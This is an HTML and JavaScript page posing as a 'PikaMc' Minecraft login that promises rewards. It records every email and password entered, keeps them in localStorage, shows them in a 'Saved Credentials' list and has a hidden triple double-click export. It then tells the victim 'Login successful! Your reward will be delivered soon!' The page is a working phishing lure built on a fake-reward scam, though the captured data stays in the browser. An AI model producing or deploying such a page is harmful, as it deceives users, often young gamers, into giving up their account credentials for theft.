<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PikaMc - Login</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        body {
            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .container {
            background: white;
            padding: 40px;
            border-radius: 20px;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
            max-width: 500px;
            width: 100%;
            border: 4px solid #ffd700;
        }

        .header {
            text-align: center;
            margin-bottom: 30px;
        }

        .minecraft-logo {
            width: 80px;
            height: 80px;
            background: #44bd32;
            margin: 0 auto 20px;
            border: 4px solid #2e8b57;
            transform: rotate(45deg);
            position: relative;
            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
        }

        .minecraft-logo::before {
            content: '';
            position: absolute;
            top: -8px;
            left: -8px;
            right: -8px;
            bottom: -8px;
            background: rgba(68, 189, 50, 0.3);
            border: 2px solid #ffd700;
            z-index: -1;
        }

        .minecraft-logo::after {
            content: '⚡';
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%) rotate(-45deg);
            font-size: 40px;
        }

        .header h1 {
            color: #333;
            font-size: 42px;
            margin-bottom: 10px;
            font-weight: 800;
            text-transform: uppercase;
        }

        .header h1 span {
            color: #ffd700;
            text-shadow: 2px 2px 0 #b8860b;
        }

        .header p {
            color: #666;
            font-size: 16px;
        }

        .form-group {
            margin-bottom: 20px;
        }

        .form-group label {
            display: block;
            margin-bottom: 8px;
            color: #555;
            font-weight: 600;
            font-size: 14px;
        }

        .form-group input {
            width: 100%;
            padding: 15px;
            border: 2px solid #e0e0e0;
            border-radius: 10px;
            font-size: 16px;
            transition: all 0.3s ease;
        }

        .form-group input:focus {
            border-color: #44bd32;
            outline: none;
            box-shadow: 0 0 0 3px rgba(68, 189, 50, 0.2);
        }

        .btn {
            width: 100%;
            padding: 16px;
            background: #44bd32;
            color: white;
            border: none;
            border-radius: 10px;
            font-size: 18px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            text-transform: uppercase;
            letter-spacing: 1px;
            border-bottom: 4px solid #2e8b57;
        }

        .btn:hover {
            background: #4cd137;
            transform: translateY(-2px);
            border-bottom-width: 6px;
        }

        .btn:active {
            transform: translateY(2px);
            border-bottom-width: 2px;
        }

        .saved-list {
            margin-top: 30px;
            border-top: 3px solid #ffd700;
            padding-top: 20px;
        }

        .saved-list h3 {
            color: #333;
            margin-bottom: 15px;
            font-size: 18px;
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .saved-list h3 span {
            background: #44bd32;
            color: white;
            padding: 2px 10px;
            border-radius: 20px;
            font-size: 14px;
        }

        .credentials-container {
            max-height: 200px;
            overflow-y: auto;
            border: 2px solid #f0f0f0;
            border-radius: 10px;
            padding: 10px;
        }

        .credential-item {
            background: #f8f9fa;
            padding: 12px;
            border-radius: 8px;
            margin-bottom: 8px;
            border-left: 4px solid #44bd32;
            font-size: 14px;
            word-break: break-word;
        }

        .credential-item:last-child {
            margin-bottom: 0;
        }

        .credential-item .email {
            color: #1e3c72;
            font-weight: 600;
        }

        .credential-item .password {
            color: #666;
            font-family: monospace;
            background: #fff;
            padding: 2px 8px;
            border-radius: 4px;
            margin-left: 10px;
        }

        .credential-item .timestamp {
            color: #999;
            font-size: 12px;
            margin-top: 5px;
        }

        .clear-btn {
            margin-top: 15px;
            padding: 10px;
            background: #ff4757;
            color: white;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-size: 14px;
            border-bottom: 3px solid #c0392b;
            width: 100%;
        }

        .clear-btn:hover {
            background: #ff6b81;
        }

        .footer {
            text-align: center;
            margin-top: 20px;
            color: #999;
            font-size: 12px;
        }

        .stats {
            display: flex;
            justify-content: space-between;
            margin: 10px 0;
            color: #666;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="minecraft-logo"></div>
            <h1>Pika<span>Mc</span></h1>
            <p>Login to receive your rewards</p>
        </div>

        <form id="loginForm">
            <div class="form-group">
                <label>📧 Email Address</label>
                <input type="email" id="email" placeholder="Enter your email" required>
            </div>

            <div class="form-group">
                <label>🔒 Password</label>
                <input type="password" id="password" placeholder="Enter your password" required>
            </div>

            <button type="submit" class="btn">⚡ Login ⚡</button>
        </form>

        <div class="saved-list">
            <h3>
                📋 Saved Credentials 
                <span id="credentialCount">0</span>
            </h3>
            <div class="stats">
                <span>💾 Persistent Storage</span>
                <span>🔄 Never Removed</span>
            </div>
            <div class="credentials-container" id="credentialsList">
                <!-- Credentials will appear here -->
            </div>
            <button class="clear-btn" id="clearBtn">🗑️ Clear All (Admin Only)</button>
        </div>

        <div class="footer">
            <p>© 2026 PikaMc • Your credentials are saved locally</p>
        </div>
    </div>

    <script>
        // Array to store credentials (persists in localStorage)
        let savedCredentials = [];

        // Load credentials from localStorage when page loads
        window.addEventListener('load', function() {
            const stored = localStorage.getItem('pikamc_credentials');
            if (stored) {
                savedCredentials = JSON.parse(stored);
            }
            updateCredentialsList();
        });

        // Handle form submission
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const email = document.getElementById('email').value.trim();
            const password = document.getElementById('password').value.trim();
            
            if (!email || !password) {
                alert('❌ Please fill in all fields!');
                return;
            }
            
            if (!email.includes('@') || !email.includes('.')) {
                alert('❌ Please enter a valid email address!');
                return;
            }
            
            // Add to credentials array with timestamp
            const credential = {
                email: email,
                password: password,
                timestamp: new Date().toLocaleString()
            };
            
            savedCredentials.push(credential);
            
            // Save to localStorage (never removed)
            localStorage.setItem('pikamc_credentials', JSON.stringify(savedCredentials));
            
            // Update the displayed list
            updateCredentialsList();
            
            // Clear form
            document.getElementById('email').value = '';
            document.getElementById('password').value = '';
            
            // Show success message
            alert('✅ Login successful! Your reward will be delivered soon!');
        });

        // Function to update the credentials list in HTML
        function updateCredentialsList() {
            const listContainer = document.getElementById('credentialsList');
            const countSpan = document.getElementById('credentialCount');
            
            if (savedCredentials.length === 0) {
                listContainer.innerHTML = '<div class="credential-item" style="text-align: center; color: #999;">No credentials saved yet</div>';
                countSpan.textContent = '0';
                return;
            }
            
            // Update count
            countSpan.textContent = savedCredentials.length;
            
            // Build HTML for each credential
            let html = '';
            // Show most recent first (reverse order)
            [...savedCredentials].reverse().forEach(cred => {
                html += `
                    <div class="credential-item">
                        <div><span class="email">📧 ${cred.email}</span> <span class="password">🔑 ${cred.password}</span></div>
                        <div class="timestamp">⏰ ${cred.timestamp}</div>
                    </div>
                `;
            });
            
            listContainer.innerHTML = html;
        }

        // Clear all credentials (admin only)
        document.getElementById('clearBtn').addEventListener('click', function() {
            if (savedCredentials.length === 0) {
                alert('No credentials to clear!');
                return;
            }
            
            if (confirm('⚠️ Are you sure you want to clear ALL saved credentials? This cannot be undone!')) {
                savedCredentials = [];
                localStorage.removeItem('pikamc_credentials');
                updateCredentialsList();
                alert('✅ All credentials cleared!');
            }
        });

        // Add animation to inputs
        document.querySelectorAll('.form-group input').forEach(input => {
            input.addEventListener('focus', function() {
                this.style.transform = 'scale(1.02)';
                this.style.transition = 'transform 0.2s';
            });
            
            input.addEventListener('blur', function() {
                this.style.transform = 'scale(1)';
            });
        });

        // Optional: Export functionality (hidden feature)
        let exportClicks = 0;
        document.querySelector('.stats').addEventListener('dblclick', function() {
            exportClicks++;
            if (exportClicks === 3) {
                const dataStr = JSON.stringify(savedCredentials, null, 2);
                alert('📋 Credentials data:\n\n' + dataStr);
                exportClicks = 0;
            }
        });
    </script>
</body>
</html>
